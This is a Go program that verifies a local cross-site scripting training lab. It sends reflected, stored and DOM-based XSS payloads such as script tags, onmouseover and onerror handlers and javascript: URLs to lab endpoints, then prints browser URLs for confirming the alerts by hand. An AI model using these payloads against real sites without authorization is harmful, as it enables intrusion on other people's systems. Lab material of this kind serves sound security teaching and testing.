// Verifier for the local/authorized basic XSS lab cases.
//
// Start the Go lab first:
//
//	go run xss_basic_lab.go -addr 127.0.0.1:8009
//
// Then run:
//
//	go run xss_verify_basic.go -base http://127.0.0.1:8009
//
// This verifier performs dependency-free HTTP/static checks. Use a browser for
// confirming actual DOM execution and click/hover-triggered alerts.
package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type result struct {
	name     string
	ok       bool
	evidence string
}

func joinURL(base, path string, params url.Values) string {
	u := strings.TrimRight(base, "/") + path
	if len(params) > 0 {
		u += "?" + params.Encode()
	}
	return u
}

func getText(u string) (string, error) {
	req, err := http.NewRequest(http.MethodGet, u, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", "basic-xss-go-verifier/1.0")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}

func postForm(base, path string, data url.Values) (string, error) {
	req, err := http.NewRequest(http.MethodPost, strings.TrimRight(base, "/")+path, bytes.NewBufferString(data.Encode()))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "basic-xss-go-verifier/1.0")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}

func checkContains(name, body, needle, passEvidence, failEvidence string) result {
	ok := strings.Contains(body, needle)
	if ok {
		return result{name: name, ok: true, evidence: passEvidence}
	}
	return result{name: name, ok: false, evidence: failEvidence}
}

func runChecks(base string) ([]result, error) {
	var out []result

	reflectedHTMLPayload := "<script>alert(1)</script>"
	body, err := getText(joinURL(base, "/reflected-html", url.Values{"search": {reflectedHTMLPayload}}))
	if err != nil {
		return nil, err
	}
	out = append(out, checkContains(
		"Reflected XSS into HTML context",
		body,
		reflectedHTMLPayload,
		"payload appeared raw in response body",
		"payload was not found raw in response body",
	))

	reflectedAttrPayload := `" onmouseover="alert(1)`
	body, err = getText(joinURL(base, "/reflected-attr", url.Values{"search": {reflectedAttrPayload}}))
	if err != nil {
		return nil, err
	}
	out = append(out, checkContains(
		"Reflected XSS into an HTML attribute",
		body,
		reflectedAttrPayload,
		"payload appeared raw inside the input value attribute",
		"payload was not found raw in the response",
	))

	storedHTMLPayload := "<script>alert(1)</script>"
	if _, err = postForm(base, "/comment", url.Values{"comment": {storedHTMLPayload}}); err != nil {
		return nil, err
	}
	body, err = getText(joinURL(base, "/post", nil))
	if err != nil {
		return nil, err
	}
	out = append(out, checkContains(
		"Stored XSS into HTML context",
		body,
		storedHTMLPayload,
		"posted payload appeared raw on the stored-comments page",
		"stored payload was not found raw on the comments page",
	))

	storedHrefPayload := "javascript:alert(1)"
	if _, err = postForm(base, "/profile", url.Values{"website": {storedHrefPayload}}); err != nil {
		return nil, err
	}
	body, err = getText(joinURL(base, "/profiles", nil))
	if err != nil {
		return nil, err
	}
	out = append(out, checkContains(
		"Stored XSS into anchor href attribute",
		body,
		storedHrefPayload,
		"stored javascript: URL appeared in an anchor href",
		"stored javascript: URL was not found in the profile page",
	))

	body, err = getText(joinURL(base, "/dom-document-write", nil))
	if err != nil {
		return nil, err
	}
	out = append(out, result{
		name:     "DOM XSS static check: document.write sink",
		ok:       strings.Contains(body, "document.write") && strings.Contains(body, "location.search"),
		evidence: choose(strings.Contains(body, "document.write") && strings.Contains(body, "location.search"), "page source contains user-controlled location.search flowing into document.write", "document.write sink was not found"),
	})

	body, err = getText(joinURL(base, "/dom-innerhtml", nil))
	if err != nil {
		return nil, err
	}
	out = append(out, result{
		name:     "DOM XSS static check: innerHTML sink",
		ok:       strings.Contains(body, "innerHTML") && strings.Contains(body, "location.search"),
		evidence: choose(strings.Contains(body, "innerHTML") && strings.Contains(body, "location.search"), "page source contains user-controlled location.search flowing into innerHTML", "innerHTML sink was not found"),
	})

	body, err = getText(joinURL(base, "/dom-href", nil))
	if err != nil {
		return nil, err
	}
	out = append(out, result{
		name:     "DOM XSS static check: href sink",
		ok:       strings.Contains(body, ".href") && strings.Contains(body, "location.search"),
		evidence: choose(strings.Contains(body, ".href") && strings.Contains(body, "location.search"), "page source contains user-controlled location.search flowing into an anchor href", "href sink was not found"),
	})

	return out, nil
}

func choose(cond bool, a, b string) string {
	if cond {
		return a
	}
	return b
}

func manualURLs(base string) []string {
	return []string{
		joinURL(base, "/reflected-html", url.Values{"search": {"<script>alert(1)</script>"}}),
		joinURL(base, "/reflected-attr", url.Values{"search": {`" onmouseover="alert(1)`}}),
		joinURL(base, "/dom-document-write", url.Values{"search": {`"><svg onload=alert(1)>`}}),
		joinURL(base, "/dom-innerhtml", url.Values{"search": {"<img src=x onerror=alert(1)>"}}),
		joinURL(base, "/dom-href", url.Values{"returnPath": {"javascript:alert(1)"}}),
	}
}

func main() {
	base := flag.String("base", "http://127.0.0.1:8009", "base URL of the lab/authorized target")
	flag.Parse()
	if !strings.HasPrefix(*base, "http://127.0.0.1") && !strings.HasPrefix(*base, "http://localhost") {
		log.Printf("WARNING: Only run this against systems you own or have explicit authorization to test.")
		time.Sleep(time.Second)
	}

	fmt.Printf("Target: %s\n\n", strings.TrimRight(*base, "/"))
	results, err := runChecks(*base)
	if err != nil {
		log.Fatal(err)
	}
	failures := 0
	for _, r := range results {
		mark := "PASS"
		if !r.ok {
			mark = "FAIL"
			failures++
		}
		fmt.Printf("[%s] %s\n       %s\n", mark, r.name, r.evidence)
	}

	fmt.Println("\nManual browser URLs for alert-based confirmation:")
	for _, u := range manualURLs(*base) {
		fmt.Println("  " + u)
	}
	fmt.Println("For DOM/href cases, open the URL in a browser; for href cases, click the rendered link.")

	if failures > 0 {
		log.Fatalf("%d checks failed", failures)
	}
}
